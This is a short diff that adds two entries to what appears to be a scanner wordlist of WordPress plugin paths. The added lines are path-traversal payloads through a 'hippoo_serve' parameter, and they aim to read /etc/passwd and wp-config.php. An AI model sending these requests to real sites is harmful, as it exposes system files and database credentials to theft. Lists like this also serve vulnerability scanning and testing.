@@ -154,3 +154,5 @@
 /wp-content/plugins/wp-live-chat-software-for-wordpress/readme.txt
 /wp-content/plugins/qubely/readme.txt
 /wp-content/plugins/bookit/readme.txt
+/?hippoo_serve=../../../../../../../etc/passwd
+/?hippoo_serve=../../../../wp-config.php
